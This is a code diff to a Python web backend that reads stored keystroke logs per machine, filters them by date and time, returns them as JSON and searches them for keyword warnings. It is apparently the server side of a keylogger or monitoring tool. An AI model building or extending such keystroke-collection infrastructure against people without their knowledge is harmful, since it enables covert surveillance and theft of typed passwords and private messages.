@@ -82,7 +82,11 @@ def get_warnings():
     data = {}
     for notification in arr_notifications:
         notice = json.loads(notification)
-        key_of_notification.append(notice.get("keywords"))
+        keywords = notice.get("keywords", [])
+        if isinstance(keywords, list):
+            key_of_notification.extend(keywords)
+        elif isinstance(keywords, str):
+            key_of_notification.append(keywords)
 
     arr_machine = get_machines_list()
     for machine in arr_machine:
@@ -128,20 +132,23 @@ def find_warnings_in_data(machine, warnings):
             for k,v in file_content.items():
                 if isinstance(v, dict):
                     for k_k , v_v in v.items():
-                        if any(k in w or k_k in w or v_v in w for w in warnings):
-                            data.setdefault(file_n, {}).setdefault(k, {}).setdefault(k_k, v_v)
+                        fields = (k, k_k, v_v)
+                        for f in fields:
+                            if any(w in f for w in warnings):
+                                data.setdefault(file_n, {}).setdefault(k, {}).setdefault(k_k, v_v)
     if data:
         return data
     return None
 
-def get_all_keystrokes(machine):
+def get_all_keystrokes():
     data = {}
-    folder = os.path.join(LOG_DIR, machine)
-    for filename in os.listdir(folder):
-        full_path = os.path.join(folder, filename)
-        with open(full_path, "r", encoding="utf-8") as f:
-            file_n = filename[:-8]
-            data[file_n] = json.load(f)
+    for machine in os.listdir(LOG_DIR):
+        folder = os.path.join(LOG_DIR, machine)
+        for filename in os.listdir(folder):
+            full_path = os.path.join(folder, filename)
+            with open(full_path, "r", encoding="utf-8") as f:
+                file_n = filename[:-8]
+                data[file_n] = json.load(f)
     if data:
         return data
     return None
@@ -154,18 +161,21 @@ def get_keystrokes(request):
     date_str = request.args.get("date")
     start_t = ptime(request.args.get("start")) or dtime(0,0,0)
     end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
-    if start_t > end_t: start_t, end_t = end_t, start_t
+    if start_t > end_t:
+        start_t, end_t = end_t, start_t
 
     folder = os.path.join(LOG_DIR, machine)
-    if not os.path.isdir(folder): return jsonify([])
+    if not os.path.isdir(folder):
+        return jsonify({})
 
     files = [f for f in os.listdir(folder) if f.endswith(".json")]
-    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
+    if date_str:
+        files = [f for f in files if f.startswith(f"{date_str}_")]
     sh, eh = start_t.hour, end_t.hour
     files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
     files.sort()
 
-    out = []
+    result = {}
     for f in files:
         p = os.path.join(folder, f)
         try:
@@ -173,17 +183,19 @@ def get_keystrokes(request):
                 obj = json.load(fh)
         except Exception:
             with open(p, "r", encoding="utf-8") as fh:
-                out.append(fh.read())
+                result.setdefault(f.split("_")[0], []).append(fh.read())
             continue
 
         if not isinstance(obj, dict):
-            out.append(json.dumps(obj, ensure_ascii=False))
+            result.setdefault(f.split("_")[0], []).append(json.dumps(obj, ensure_ascii=False))
             continue
 
         filtered = {k:v for k,v in obj.items()
                     if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
         if filtered:
-            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
-    return out
+            result.setdefault(f.split("_")[0], []).append(
+                json.dumps(filtered, ensure_ascii=False, indent=2)
+            )
 
-print(get_warnings())
+    return jsonify(result)
+
